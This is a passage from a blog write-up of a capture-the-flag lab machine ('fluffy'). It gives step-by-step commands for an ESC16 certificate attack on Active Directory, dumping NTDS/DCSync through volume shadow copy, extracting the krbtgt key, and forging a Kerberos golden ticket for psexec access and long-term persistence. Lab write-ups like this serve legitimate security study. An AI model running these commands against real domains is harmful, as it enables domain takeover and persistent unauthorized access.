certipy-ad req -u "ca_svc" -hashes \:$hash -dc-ip $box -target $machine.$domain -ca "fluffy-DC01-CA" -template "User"
```

{{< figure src="/ox-hugo/2025-06-11-071525_.png" >}}

**Step 3**: Revert the "victim" account's UPN.

```shell
certipy-ad account -u "$user@$domain" -hashes \:$hash -dc-ip $box -user 'ca_svc' -upn 'ca_svc@fluffy.htb' update
```

{{< figure src="/ox-hugo/2025-06-11-071909_.png" >}}

**Step 4**: Authenticate as the target administrator.

```shell
certipy-ad auth -username "administrator" -pfx administrator.pfx -domain $domain -dc-ip $box
```

{{< figure src="/ox-hugo/2025-06-11-072016_.png" >}}

Let's verify our hash works:

```shell
netexec smb $box -u $user -H $hash --shares
```

{{< figure src="/ox-hugo/2025-06-11-072216_.png" >}}

We actually never got our flags so let's grab those.
First let's grab the root flag
![](/ox-hugo/2025-06-11-072345_.png)

Second, let's grab our user flag, it was for the winrm_svc user which tracks as that user was part of the remote users group.
![](/ox-hugo/2025-06-11-072642_.png)


## 5. Persistence: {#5-dot-persistence}


### Dumping NTDS.dit/DCSync attack: {#dumping-ntds-dot-dit-dcsync-attack}

Perform DCSync attack using netexec:

```shell
netexec smb $box -u $user -H $hash --ntds vss --user krbtgt
```

+Note+: `--ntds vss` this explicitly tells NetExec to use the VSS method (Volume Shadow Copy Service) instead of `DRSUAPI`. I did this as the standard `ntdsutil` was failing, meaning DRSUAPI was being `blocked`.
![](/ox-hugo/2025-06-11-192926_.png)


### Creating a Kerberos Golden Ticket: {#creating-a-kerberos-golden-ticket}

First let's Sync our clock to the host using `ntpdate`

```shell
#Using ntpdate
sudo ntpdate -s $domain

#Using faketime
faketime "$(ntpdate -q $domain | cut -d ' ' -f 1,2)"
```

First we use `impacket-lookupsid` to get the Domain SID:

```shell
impacket-lookupsid $domain/$user@$machine.$domain -domain-sids -hashes \:$hash
```

+Note+ I store this in the variable `$sid`
![](/ox-hugo/2025-06-11-191208_.png)

Now we will use `impacket-secretsdump` to retrieve the `aeskey` of the `krbtgt` account:

```shell
# Volume Shadow Service flag is appended as this was not working without it.
impacket-secretsdump $domain/$user@$box -hashes :$hash -use-vss
```

+Note+: I store `krbtgt:aes256` value in the variable `$krbtgt`
![](/ox-hugo/2025-06-11-194321_.png)

Now we use `impacket-ticketer` to create the Golden Ticket:

```shell
#Using -aeskey
impacket-ticketer -aesKey $krbtgt -domain-sid $sid -domain $domain Administrator
```

{{< figure src="/ox-hugo/2025-06-11-194556_.png" >}}

Export the ticket to the\* `KRB5CCNAME` Variable:

```shell
export KRB5CCNAME=./Administrator.ccache
```

Let's validate the ticket works by using the ticket for connecting via `psexec`

```shell
impacket-psexec -k -no-pass $machine.$domain
```

{{< figure src="/ox-hugo/2025-06-11-194700_.png" >}}


#### Why create a golden ticket? {#why-create-a-golden-ticket}

"But bloodstiller why are you making a golden ticket if you have the admin hash?" Glad you asked:

Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here’s why:

`KRBTGT` **Hash Dependence**:

Golden Tickets are generated using the `KRBTGT` account hash from the target’s domain controller.

Unlike user account passwords, `KRBTGT` hashes are rarely rotated (and in many organizations, +they are never changed+), so in most cases the Golden Ticket remains valid indefinitely.

`KRBTGT` **The Key to It All (for upto 10 years)**:

A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials, just look.

{{< figure src="/ox-hugo/2025-06-11-194802_.png" >}}

This makes it a reliable backdoor, especially if re-access is needed long after initial entry.

**Think about it**: even if they reset every user’s password (including the administrator etc) your Golden Ticket is still valid because it’s tied to the `KRBTGT` account, not individual users.


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  With this one, I mainly learned about `ESC16` this was a cert attack I have not done before and was fun to exploit.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Took me a minute before I realized I could run the attack on the `CA_SVC` account.
2.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at bloodstiller dot com

